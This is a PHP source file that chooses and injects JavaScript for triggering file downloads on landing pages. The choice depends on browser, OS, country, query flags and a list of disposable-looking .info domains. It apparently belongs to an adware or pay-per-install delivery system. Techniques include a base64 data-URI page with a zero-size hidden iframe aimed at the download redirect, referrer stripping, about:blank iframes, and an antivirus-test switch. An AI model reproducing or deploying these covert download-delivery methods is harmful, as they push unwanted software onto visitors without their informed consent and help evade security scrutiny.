<?php
      ##############################################
     // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    //
    //	SEE EXPRESSION BELOW CLASS DEFINITION    // 
   //   FOR AVAILABLE DOWNLOAD METHODS          //
  //    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
 ###############################################

namespace LPO\Digest\Injectable;

use LPO\Bootstrap;
use LPO\Digest\Injectable\DownloadMethod\AboutBlankIframe;
use LPO\Digest\Injectable\DownloadMethod\DataURI;
use LPO\Digest\Injectable\DownloadMethod\Direct;
use LPO\Digest\Injectable\DownloadMethod\FileApi;
use LPO\Digest\Injectable\DownloadMethod\IframeDataURI;
use LPO\Digest\Injectable\DownloadMethod\NoReferrerFileApi;
use LPO\DownloadMethodRule;
use LPO\Persistence\DownloadMethod as PersistenceDownloadMethod;
use QueryString;
use Request;

class DownloadMethod implements JavascriptInjector {

	const VARIABLE_NAME = 'downloadMethod';

	/**
	 * @var string[]
	 */
	public static $activeMethods;

	/**
	 * @param Bootstrap $bootstrap
	 *
	 * @return string
	 */
	public function getTemplateVariableData(Bootstrap $bootstrap)
	{
		$results                   = DownloadMethodRule::getPermutations($bootstrap::$attributes);
		$downloadMethodIdFromRules = DownloadMethodRule::getDownloadMethodIdFromRules($results);

		$downloadMethodId = (isset(static::$activeMethods[$downloadMethodIdFromRules]) ?
			$downloadMethodIdFromRules :
			PersistenceDownloadMethod::__default
		);


		/**
		 * @var DownloadMethod $className
		 */
		if(
			$bootstrap::$attributes->getCountryCode() != 'IL' &&
			$bootstrap::$attributes->getBrowserId() == Request::BROWSER_CHROME &&
			($bootstrap::$attributes->getOsId() == Request::OS_WIN_8_1 || $bootstrap::$attributes->getOsId() == Request::OS_WIN_8)
		)
		{
			$className = static::$activeMethods[PersistenceDownloadMethod::DATA_URI];
		}else{
			$className = static::$activeMethods[$downloadMethodId];
		}

		$queryString = QueryString::getInstance();

		if($queryString->getParam('ifduri',false)!==false)
		{
			$downloadMethod = new IframeDataURI();
		}
		else if($queryString->getParam('snobref',false)!==false)
		{
			$downloadMethod = new NoReferrerFileApi();
		}
		else if(defined('AV_QUERY_TEST') || $queryString->getParam('directd',false)!==false)
		{
			$downloadMethod = new Direct();
		}
		else if($queryString->getParam('aboutblank',false)!==false)
		{
			$downloadMethod = new AboutBlankIframe();
		}
		else if($queryString->getParam('doomsday',false)!==false)
		{
			$downloadMethod = new DataURI;
		}
		else if($queryString->getParam('tomcode',false)!==false)
		{
			$downloadMethod = new FileApi();
		}
		else
		{
//			$osId = $bootstrap::$attributes->getOsId();
//			if($bootstrap::$attributes->getBrowserId() == Request::BROWSER_CHROME && ($osId == Request::OS_WIN_8 || $osId == Request::OS_WIN_8_1))
//			{
//				$downloadMethod = new DataURI();
//			}
//			else
//			{
				$downloadMethod = new $className;
//			}
		}

		switch(strtolower(Request::getHostName()))
		{
			case 'webforallwebests.info':
			case 'websstarsurecomp.info':
			case 'zillionapplicationgrabb.info':
			case 'zilliondocumentsitefun.info':
			case 'zilliondraivermagicfast.info':
			case 'zillionmastercanadain.info':
			case 'zillionsolutioncustoml.info':
			case 'zillionsuperstoragemy.info':
			case 'maxapplicationgrabb.info':
//			case 'maxdocumentsitefun.info':
				$downloadMethod = new Direct();
				break;
		}

		if($downloadMethod instanceof IframeDataURI)
		{
			$bootstrap->iframeLink = 'data:text/html;base64,'.base64_encode('<doctype html> <html> <head> </head> <body> <iframe src="'
					.$bootstrap->downloadRedirectUrl.'" height="0" width="0"></iframe> </body> </html>');
		}

		$script = $downloadMethod->getSourceScript().';'.$downloadMethod->getInvokingScript($bootstrap);

		return $script;
	}

	/**
	 * @return string
	 */
	function getInjectedScript()
	{
		return '<?php echo $'.self::VARIABLE_NAME.' ?>';
	}

	/**
	 * @return string
	 */
	public static function getVariableName()
	{
		return self::VARIABLE_NAME;
	}

}

//todo: move to normal configuration
DownloadMethod::$activeMethods = array(
	PersistenceDownloadMethod::IFRAME               => __NAMESPACE__ . '\DownloadMethod\Iframe',
	PersistenceDownloadMethod::JSON_FILE_API        => __NAMESPACE__ . '\DownloadMethod\JsonFileApi',
	PersistenceDownloadMethod::FILE_API             => __NAMESPACE__ . '\DownloadMethod\FileApi',
	PersistenceDownloadMethod::NO_REFERRER_FILE_API => __NAMESPACE__ . '\DownloadMethod\NoReferrerFileApi',
	PersistenceDownloadMethod::DATA_URI             => __NAMESPACE__ . '\DownloadMethod\DataURI',
	PersistenceDownloadMethod::ABOUT_BLANK_IFRAME   => __NAMESPACE__ . '\DownloadMethod\AboutBlankIframe',
	PersistenceDownloadMethod::IFRAME_DATA_URI      => __NAMESPACE__ . '\DownloadMethod\IframeDataURI',
	PersistenceDownloadMethod::DIRECT               => __NAMESPACE__ . '\DownloadMethod\Direct',
);